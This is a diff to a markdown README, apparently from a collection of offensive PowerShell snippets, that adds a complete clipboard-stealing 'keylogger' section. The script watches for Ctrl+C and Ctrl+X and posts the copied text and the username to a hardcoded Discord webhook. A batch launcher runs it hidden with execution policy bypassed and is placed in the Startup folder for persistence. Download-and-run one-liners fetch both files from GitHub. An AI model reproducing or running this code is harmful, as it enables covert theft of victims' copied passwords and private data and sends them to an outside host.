@@ -56,10 +56,73 @@ screenshot($path)
 
 ## Keylogger
 
-TODO
+The powershell scripts posts the clipboard content to the Discord chat when the user presses Ctrl+c or Ctrl+x
+
+- Create a Discord webhook and add it as the value of $hookUrl in the script. [Discord Webhooks](https://discordjs.guide/popular-topics/webhooks.html#what-is-a-webhook)
+- Save the following script as update.ps1
+- Save update.ps1 to $env:userprofile\AppData\Roaming
 
 ```
+Add-Type -AssemblyName WindowsBase
+Add-Type -AssemblyName PresentationCore
+
+function dischat {
+
+  [CmdletBinding()]
+  param (    
+  [Parameter (Position=0,Mandatory = $True)]
+  [string]$con
+  ) 
+  
+  $hookUrl = 'https://discord.com/api/webhooks/1073180088213970974/yOv89KtG64YMHt20rYTDXrO_a43b7KroOMoZ2JipIHMM5VIjGZ8_ngDs8JMAYEom4kmT'
+  
+$Body = @{
+  'username' = $env:username
+  'content' = $con
+}
+
+
+Invoke-RestMethod -Uri $hookUrl -Method 'post' -Body $Body
+
+}
+
+
+dischat (get-clipboard)
+
+while (1){
+    $Lctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::'LeftCtrl')
+    $Rctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::RightCtrl)
+    $cKey = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::c)
+    $xKey = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::x)
+
+       if (($Lctrl -or $Rctrl) -and ($xKey -or $cKey)) {dischat (Get-Clipboard)}
+       elseif ($Rctrl -and $Lctrl) {dischat "---------connection lost----------";exit}
+       else {continue}
+} 
 ```
+
+.bat script to run the powershell script
+
+Save the following script as per.bat
+
+```
+@echo off
+powershell -Command "& {cd "$env:userprofile\AppData\Roaming"; powershell -w h -NoP -NonI -Ep Bypass -File "update.ps1"}"
+pause
+```
+
+Then save the bat file into startup programs and run the bat script by double clicking on it.
+
+You can also host the scripts online, download them and run them using the three following commands.
+
+```
+powershell -w h -NoP -NonI -Ep Bypass 'Invoke-WebRequest -Uri "https://raw.githubusercontent.com/<your-github>/<your-repor>/main/update.ps1" -OutFile "$env:userprofile\AppData\Roaming\update.ps1" -UseBasicParsing'
+powershell -w h -NoP -NonI -Ep Bypass 'Invoke-WebRequest -Uri "https://raw.githubusercontent.com/<your-github>/<your-repor>/main/per.bat" -OutFile "$env:APPDATA\Microsoft\Windows\Start` Menu\Programs\Startup\per.bat" -UseBasicParsing'
+Invoke-Expression -Command "& '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\per.bat'" 
+
+```
+
+
 
 ## Zipping files and directories
 
